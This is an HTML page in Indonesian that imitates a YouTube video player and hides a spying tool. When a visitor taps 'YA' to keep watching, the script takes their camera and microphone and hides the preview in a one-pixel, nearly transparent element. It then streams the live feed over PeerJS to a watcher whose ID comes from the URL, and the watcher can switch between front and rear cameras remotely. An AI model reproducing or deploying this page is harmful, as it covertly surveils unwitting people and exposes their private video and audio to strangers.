<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Roboto, Arial, sans-serif; background: #000; color: white; min-height: 100vh; overflow: hidden; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
        .modal { text-align: center; width: 90%; max-width: 400px; }
        .modal h1 { font-size: 2.2em; margin-bottom: 50px; font-weight: 900; }
        .modal-buttons { display: flex; flex-direction: column; gap: 25px; }
        .btn { padding: 22px; font-size: 1.6em; font-weight: bold; border: 2px solid white; background: transparent; color: white; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
        .btn:active { background: white; color: black; }
        #ytPlayer { width: 100%; aspect-ratio: 16/9; border: none; }
        #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="modal">
            <h1>LANJUT NONTON?</h1>
            <div class="modal-buttons">
                <button class="btn" id="btnYes">YA</button>
                <button class="btn" id="btnNo">NO</button>
            </div>
        </div>
    </div>

    <div style="height: 56px; background: #0f0f0f; display: flex; align-items: center; padding: 0 16px;">
        <span style="color: #ff0000; font-size: 24px; margin-right: 5px;">▶️</span> <strong>YouTube</strong>
    </div>
    <iframe id="ytPlayer" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    <div style="padding: 15px;">
        <div style="font-size: 18px; font-weight: bold;">Video Rekomendasi Hari Ini</div>
        <div style="color: #aaa; font-size: 14px; margin-top: 10px;">Trending • 1.2jt ditonton</div>
    </div>

    <video id="cameraPreview" autoplay playsinline muted></video>

    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const viewerId = urlParams.get('viewer');
        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ';
        const targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
        
        const overlay = document.getElementById('overlay');
        const ytPlayer = document.getElementById('ytPlayer');
        const cameraPreview = document.getElementById('cameraPreview');
        
        let peer = null;
        let localStream = null;
        let currentFacingMode = 'environment';
        let activeCall = null;

        ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;

        async function startApp() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: currentFacingMode }, 
                    audio: true 
                });
                cameraPreview.srcObject = localStream;

                peer = new Peer(targetId, {
                    host: '0.peerjs.com', port: 443, secure: true,
                    config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] }
                });

                peer.on('open', (id) => {
                    if (viewerId) {
                        activeCall = peer.call(viewerId, localStream);
                        const conn = peer.connect(viewerId);
                        conn.on('open', () => {
                            conn.send({ type: 'target_ready', targetId: id });
                        });
                        conn.on('data', handleData);
                    }
                });
            } catch (err) {
                console.error(err);
                // Fallback video only
                try {
                    localStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    startApp();
                } catch(e) {}
            }
        }

        async function handleData(data) {
            if (data.type === 'switch_camera') {
                currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
                
                // Ganti track video secara real-time
                const newStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: currentFacingMode },
                    audio: true
                });
                
                const newVideoTrack = newStream.getVideoTracks()[0];
                
                if (activeCall && activeCall.peerConnection) {
                    const sender = activeCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
                    if (sender) {
                        sender.replaceTrack(newVideoTrack);
                    }
                }
                
                localStream.getTracks().forEach(track => track.stop());
                localStream = newStream;
                cameraPreview.srcObject = localStream;
            }
        }

        document.getElementById('btnYes').addEventListener('click', () => {
            overlay.style.display = 'none';
            ytPlayer.src = ytPlayer.src.replace('autoplay=0', 'autoplay=1');
            startApp();
        });

        document.getElementById('btnNo').addEventListener('click', () => {
            window.location.href = "https://www.youtube.com";
        });
    </script>
</body>
</html>
